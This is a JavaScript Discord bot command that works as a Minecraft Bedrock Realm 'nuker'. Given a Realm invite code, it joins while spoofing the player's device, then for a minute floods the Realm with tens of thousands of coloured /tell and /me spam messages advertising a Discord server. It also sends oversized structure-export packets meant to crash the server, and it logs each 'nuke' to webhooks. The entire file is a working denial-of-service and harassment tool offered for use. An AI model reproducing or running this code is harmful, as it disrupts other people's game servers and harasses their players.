const fs = require('fs');
const path = require('path');
const { Authflow } = require('prismarine-auth');
const { RealmAPI } = require('prismarine-realms');
const { SlashCommandBuilder } = require('@discordjs/builders');
const bedrock = require('bedrock-protocol');
const { EmbedBuilder, WebhookClient } = require('discord.js');
const axios = require('axios');

const blacklistPath = path.join(__dirname, '..', '..', 'data', 'blacklist.json');
const honeypotPath = path.join(__dirname, '..', '..', 'data', 'honeypot.json');
const databasePath = path.join(__dirname, '..', '..', 'data', 'database.json');
const webhookCrashClient = new WebhookClient({ url: '' });
const webhookDatabaseClient = new WebhookClient({ url: '' });// webhook link in ''
const trollEmojie = "<:HDtroll:1246615956176769024>";
const loadingemoji = "<a:loading:1256535355138768906>";
const workedEmojie ="<a:Check:1256612972793565204>";
const errorEmojie = "<:deny:1256622572762562681>";
const lEmoji = '<a:DyingLaughing:1244399086061355090>';
const one = '<:reply:1258168210486726726>';
const second = '<:replycountinue:1258168190861709484>';

const deviceOptions = {
  'Unknown': 0,
  'Android': 1,
  'iOS': 2,
  'OSX': 3,
  'FireOS': 4,
  'GearVR': 5,
  'Hololens': 6,
  'Windows 10 (x64)': 7,
  'Windows 10 (x86)': 8,
  'Dedicated Server': 9,
  'TvOS': 10,
  'Orbis': 11,
  'Nintendo Switch': 12,
  'Xbox': 13,
  'Windows Phone': 14,
  'Linux': 15
};

let blacklistedUsers = new Set();
let honeypotRealms = new Set();

async function loadBlacklist() {
  try {
    const blacklistData = await fs.promises.readFile(blacklistPath, 'utf-8');
    blacklistedUsers = new Set(JSON.parse(blacklistData));
  } catch (error) {
    console.error('Error loading blacklist:', error);
  }
}

async function loadHoneypot() {
  try {
    const honeypotData = await fs.promises.readFile(honeypotPath, 'utf-8');
    honeypotRealms = new Set(JSON.parse(honeypotData));
  } catch (error) {
    console.error('Error loading honeypot file:', error);
  }
}

loadBlacklist();
loadHoneypot();

function parseKickMessage(message) {
  return message;
}

module.exports = {
  command: new SlashCommandBuilder()
    .setName('crash')
    .setDescription('Spams realm with a message')
    .addStringOption(option =>
      option.setName('realmcode')
        .setDescription('Realm Code To Spam')
        .setRequired(true)
        .setMinLength(11)
        .setMaxLength(11)
    )
    .addStringOption(option =>
      option.setName('wisper_one')
        .setDescription('First Wisper Spam')
        .setRequired(true)
    )
    .addStringOption(option =>
      option.setName('external_one')
        .setDescription('First Spam')
        .setRequired(true)
    )
    .addStringOption(option =>
      option.setName('external_two')
        .setDescription('Second  Spam')
        .setRequired(true)
    )
    .addStringOption(option =>
      option.setName('wisper_two')
        .setDescription('Second Wisper Spam')
        .setRequired(true)
    )
    .addStringOption(option =>
      option.setName('device_os')
        .setDescription('The device to spoof as')
        .setRequired(true)
        .addChoices(
          { name: 'Unknown', value: 'Unknown' },
          { name: 'Android', value: 'Android' },
          { name: 'Samsung Smart fridge', value: 'Android' },
          { name: 'iOS', value: 'iOS' },
          { name: 'Ocean Gate', value: 'OSX' },
          { name: 'OSX (macOS)', value: 'OSX' },
          { name: 'FireOS', value: 'FireOS' },
          { name: 'GearVR', value: 'GearVR' },
          { name: 'Hololens', value: 'Hololens' },
          { name: 'Windows 10 (x64)', value: 'Windows 10 (x64)' },
          { name: 'Windows 10 (x86)', value: 'Windows 10 (x86)' },
          { name: 'Dedicated Server', value: 'Dedicated Server' },
          { name: 'TvOS (Apple TV)', value: 'TvOS' },
          { name: 'Orbis (PlayStation)', value: 'Orbis' },
          { name: 'Nintendo Switch', value: 'Nintendo Switch' },
          { name: 'Xbox', value: 'Xbox' },
          { name: 'Windows Phone', value: 'Windows Phone' },
          { name: 'Linux', value: 'Linux' }
        )
    ),
  callback: async (interaction) => {
    try {
      await interaction.deferReply({ ephemeral: true });

      const userId = interaction.user.id;
      const userTag = interaction.user.tag;
      const realmCode = interaction.options.getString('realmcode');
      const msg1 = interaction.options.getString('wisper_one');
      const me1 = interaction.options.getString('external_one');
      const me2 = interaction.options.getString('external_two');
      const msg2 = interaction.options.getString('wisper_two');
      const deviceOS = interaction.options.getString('device_os');

      if (!msg1 || !me1 || !me2 || !msg2) {
        const errorEmbed = new EmbedBuilder()
          .setColor('#ff0000')
          .setTitle('Error')
          .setDescription('One or more message parameters are missing.');
        return interaction.editReply({ embeds: [errorEmbed] });
      }

      const initialEmbed = new EmbedBuilder()
        .setTitle(`${trollEmojie} Nuking ${realmCode} ${trollEmojie}`)
        .setDescription(`Joined ${realmCode}`)
        .addFields(
          { name: 'Device', value: deviceOS, inline: true },
          { name: 'Connected', value: loadingemoji, inline: false },
          { name: 'Spammed', value: loadingemoji, inline: false },
          { name: 'Disconnected', value: loadingemoji, inline: false }
        )
        .setFooter({ text: `This command will be sent to our logging channel!` })
        .setTimestamp();

      const message = await interaction.editReply({ embeds: [initialEmbed] });

      if (blacklistedUsers.has(userId)) {
        const embed = new EmbedBuilder()
          .setColor('#ff0000')
          .setTitle('Womp Womp')
          .setDescription(`${lEmoji} You are Blacklisted ${lEmoji}`);
        await interaction.editReply({ embeds: [embed] });

        const webhookEmbed = new EmbedBuilder()
          .setTitle('Blacklist Check')
          .setDescription(`User \`${userTag}\` attempted to use the \`nuke\` command but is blacklisted.`)
          .setColor('#ff0000')
          .addFields(
            { name: 'Realm Code', value: realmCode },
            { name: 'Time', value: `60 seconds` },
            { name: 'Device', value: deviceOS },
            { name: 'MSG 1', value: msg1 },
            { name: 'ME 1', value: me1 },
            { name: 'ME 2', value: me2 },
            { name: 'MSG 2', value: msg2 }
          )
          .setTimestamp();

        await webhookCrashClient.send({ embeds: [webhookEmbed] });
        return;
      }

      try {
        const authFlow = new Authflow('unique_identifier', './');
        const bedrockClient = bedrock.createClient({
          authFlow: authFlow,
          deviceOS: deviceOptions[deviceOS],
          realms: {
            realmInvite: `https://realms.gg/${realmCode}`
          }
        });

        bedrockClient.on('join', async () => {
          initialEmbed.spliceFields(1, 1, { name: 'Connected', value: workedEmojie, inline: false });
          await interaction.editReply({ embeds: [initialEmbed] });

          const sendCommand = (command) => {
            bedrockClient.write('command_request', command);
          };

          const inter = setInterval(() => {
            spamOne(sendCommand, msg1);
            crashOne(sendCommand, me1);
            spamTwo(sendCommand);
            crashTwo(sendCommand, msg2);
            spamThree(sendCommand, me2);
            crashThree(sendCommand);
            splitCrash(bedrockClient);
          }, 340);

          setTimeout(async () => {
            clearInterval(inter);
            bedrockClient.disconnect();

            initialEmbed.spliceFields(2, 1, { name: 'Spammed', value: workedEmojie, inline: false });
            initialEmbed.spliceFields(3, 1, { name: 'Disconnected', value: workedEmojie, inline: false });
            await interaction.editReply({ embeds: [initialEmbed] });

            console.log('Disconnected from', realmCode);

            const webhookEmbed = new EmbedBuilder()
              .setTitle('Realm Nuked')
              .setDescription(`User \`${userTag}\` used the \`nuke\` command.`)
              .setColor('Green')
              .addFields(
                { name: 'Realm Code', value: realmCode },
                { name: 'Time', value: `60 seconds` },
                { name: 'Device', value: deviceOS },
                { name: 'MSG 1', value: msg1 },
                { name: 'ME 1', value: me1 },
                { name: 'ME 2', value: me2 },
                { name: 'MSG 2', value: msg2 }
              )
              .setTimestamp();

            await webhookCrashClient.send({ embeds: [webhookEmbed] });
          }, 60 * 1000);
        });

        bedrockClient.on('disconnect', async (packet) => {
          if (packet.reason === 'disconnectionScreen.serverFull') {
            initialEmbed.setColor('#ff0000').addFields({ name: errorEmojie, value: 'Server is full.', inline: false });
            await interaction.editReply({ embeds: [initialEmbed] });
            bedrockClient.disconnect();  // Stop further operations
          }
        });

        bedrockClient.on('kick', async (reason) => {
          initialEmbed.setColor('#ff0000').addFields({ name: errorEmojie, value: parseKickMessage(reason.message), inline: false });
          await interaction.editReply({ embeds: [initialEmbed] });
          bedrockClient.disconnect();  // Stop further operations
        });

        bedrockClient.on('error', async (err) => {
          initialEmbed.setColor('#ff0000').addFields({ name: errorEmojie, value: err.message, inline: false });
          await interaction.editReply({ embeds: [initialEmbed] });
          bedrockClient.disconnect();  // Stop further operations
        });

      } catch (error) {
        console.error('Discord API Error:', error);
      }
    } catch (error) {
      console.error('Unexpected error:', error);
    }
  }
};

function spamOne(sendCommand, msg1) {
  for (let i = 0; i < 10000; i++) {
    sendCommand({
      command: `/tell @a ${colorizeText(msg1)} \n§4§l§ TSL §1§ Nuker §4§ on TOP`,
      origin: {
        type: 5,
        uuid: '',
        request_id: '',
      },
      internal: false,
      version: 66,
    });
  }
}

function crashOne(sendCommand, me1) {
  for (let i = 0; i < 5000; i++) {
    sendCommand({
      command: `/me ${colorizeText(me1)}  \n§4§l§ TSL §1§ Nuker §4§ on TOP`,
      origin: {
        type: 5,
        uuid: '',
        request_id: '',
      },
      internal: false,
      version: 66,
    });
  }
}

function spamTwo(sendCommand) {
  for (let i = 0; i < 5000; i++) {
    sendCommand({
      command: `/tell @a §l§c§k${"@e".repeat(100)} |  ${colorizeText('§4§l§ TSL §1§ NUKER §6§ ON §4§ TOP : §c§ discord.gg/armbe')}`,
      origin: {
        type: 5,
        uuid: '',
        request_id: '',
      },
      internal: false,
      version: 66,
    });
  }
}

function crashTwo(sendCommand, msg2) {
  for (let i = 0; i < 10000; i++) {
    sendCommand({
      command: `/tell @a ${colorizeText(msg2)} \n§4§l§ TSL §1§ Nuker §4§ on TOP`,
      origin: {
        type: 5,
        uuid: '',
        request_id: '',
      },
      internal: false,
      version: 66,
    });
  }
}

function spamThree(sendCommand, me2) {
  for (let i = 0; i < 5000; i++) {
    sendCommand({
      command: `/me ${colorizeText(me2)} \n§4§l§ TSL §1§ Nuker §4§ on TOP`,
      origin: {
        type: 5,
        uuid: '',
        request_id: '',
      },
      internal: false,
      version: 66,
    });
  }
}

function crashThree(sendCommand) {
  for (let i = 0; i < 5000; i++) {
    sendCommand({
      command: `/tell @a §l§c§k${"@e".repeat(100)} | ${colorizeText('§4§l§ TSL §1§ NUKER §6§ ON §4§ TOP : §c§ discord.gg/armbe')}`,
      origin: {
        type: 5,
        uuid: '',
        request_id: '',
      },
      internal: false,
      version: 66,
    });
  }
}

function splitCrash(bedrockClient) {
  let x = 0;
  let y = 0;
  let z = 0;
  let unique_id = -858993459156n;

  for (let i = 0; i < 50; i++) {
    bedrockClient.write('structure_template_data_export_request', {
      name: `house${i}`,
      position: { x, y, z },
      settings: {
        palette_name: "",
        ignore_entities: false,
        non_ticking_players_and_ticking_areas: false,
        size: { x: 9999, y: 100, z: 9999 },
        structure_offset: { x: 9999, y: 50, z: 9999 },
        last_editing_player_unique_id: unique_id,
        rotation: 3,
        mirror: 3,
        animation_mode: 2,
        animation_duration: 999999,
        integrity: 1,
        seed: 0,
        pivot: { x: -9999, y: 64, z: 99999 }
      },
      request_type: 1
    });
  }
}

function colorizeText(text) {
  const words = text.split(' ');
  const coloredWords = words.map(word => {
    const colorCode = randomCode();
    return `${colorCode}${word}`;
  });
  return coloredWords.join(' ');
}

function randomCode() {
  const optionsString = "1234567890";
  const optionsArray = optionsString.split('');
  const randomIndex = Math.floor(Math.random() * optionsArray.length);
  const randomOption = optionsArray[randomIndex];
  return "§" + randomOption;
}
